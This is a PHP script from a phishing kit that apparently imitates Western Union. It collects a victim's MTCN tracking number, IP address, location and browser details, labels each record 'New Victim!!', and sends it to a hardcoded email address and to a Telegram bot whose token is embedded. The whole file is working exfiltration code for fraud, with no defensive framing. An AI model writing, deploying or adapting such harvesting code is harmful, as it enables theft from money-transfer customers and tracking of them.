<?php
include("system.php");
include("detect.php");

$chatId = "@mtcnreslut";
$botUrl = "bot5371851258:AAGPc-1B1UCt9V8gPdOP-0h2bUP0SZ7QgC8";
$telegram = "on"; // off if u don't need result to telegram
$phrase_ids = "noufelben25@protonmail.ch"; // your email here 
extract($_REQUEST);

# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$_SESSION['trackingNumber']   = $_POST['trackingNumber'];

$ip		= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);
# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
New Victim!!
MTCN   : ".$_SESSION['trackingNumber']."
IP     : $ip
country: $countryname
City   : $countrycity
TIME   : $InfoDATE 
Agent  : $UserAgent
";

$msg = "
New Victim!! <br>
MTCN   : ".$_SESSION['trackingNumber']." <br>
IP     : $ip <br>
country: $countryname <br>
City   : $countrycity <br>
TIME   : $InfoDATE <br>
Agent  : $UserAgent <br>
";


// Email send function
$sender = 'From: 💎 C0DeX 💎 <result@codex.com>';
$sub="NEW VICTIM!! MTCN  FROM [$ip]";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($phrase_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
